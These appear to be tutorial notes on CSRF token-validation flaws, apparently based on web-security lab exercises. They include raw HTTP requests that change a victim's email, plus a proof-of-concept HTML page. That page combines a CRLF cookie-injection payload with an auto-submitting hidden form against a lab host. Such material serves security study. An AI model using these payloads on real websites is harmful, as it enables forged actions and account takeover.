
## Summary

The following methods may be used to bypass the CSRF token validation:
1. Change request type (e.g. from GET to POST)
2. Do not include a csrf token at all
3. Use a known csrf token (login to your account and send your csrf token in the payload)
4. If the website contains a cookie-setting functionality, check if the csrf token is associated to a non-session cookie and send both to the user's browser.

## What is a CSRF token?

A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action.

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

```http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

When implemented correctly, CSRF tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid request on behalf of the victim. As the attacker has no way of predicting the correct value for the CSRF token, they won't be able to include it in the malicious request

## Common flaws

### Validation of CSRF token depends on request method

Some applications may validate the CSRF token on POST but not on GET

```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

### Validation of CSRF token depends on token being present

Some applications will skip validation if the token is emmited.

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

### CSRF token is not tied to the user session

Some applications do not validate if the token belongs to the same session as the user who is making the request. An attacker can log in to the application, obtain a valid token, and then feed that token to the victim.

### CSRF token is tied to a non-session cookie

*Note:* The website needs a cookie-setting functionality for this attack to work.

In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

Exploit example:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a8e007b047a489fc2532caf001f0010.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="update2&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="879Bdd8QtCt927g0ZVE0axISbraVssy0" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0a8e007b047a489fc2532caf001f0010.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=kZAzUyWo3pfV7suHjMwHiq2UEO7CpOIg%3b%20SameSite=None" onerror="document.forms[0].submit()">

  </body>
</html>
```

### CSRF token is simply duplicated in a cookie

The concept is the same as above, except the cookie value is duplicated with the csrf token.

```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```